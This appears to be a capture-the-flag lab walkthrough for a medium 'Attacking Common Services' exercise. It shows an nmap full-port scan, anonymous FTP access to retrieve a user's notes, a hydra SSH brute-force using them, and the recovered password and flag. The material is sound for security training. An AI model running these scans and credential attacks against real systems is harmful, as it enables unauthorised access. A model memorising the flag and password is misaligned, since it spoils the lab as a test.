# Attacking Common Services - Medium

The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.

## Walkthrough

```bash
sudo nmap -sS -n -Pn -p- --min-rate 5000 10.129.191.76 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 03:43 EST
Nmap scan report for 10.129.191.76
Host is up (0.26s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
110/tcp   open  pop3
995/tcp   open  pop3s
2121/tcp  open  ccproxy-ftp
30021/tcp open  unknown
```

try anonymous login on all the ftp

```bash
#we found the hidden ftp server, that allow anonymous login
ftp 10.129.191.76 30021
Name (10.129.191.76:kali): anonymous
cd simon
get mynotes.txt
```

it seems like a password, lets try ssh as simon with that notes

```bash
hydra -l simon -P mynotes.txt -f 10.129.191.76 ssh -t 64 
[22][ssh] host: 10.129.191.76   login: simon   password: 8Ns8j1b!23hs4921smHzwn
```

lets ssh and see&#x20;

```bash
ssh simon@10.129.191.76    
cat flag.txt 
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```
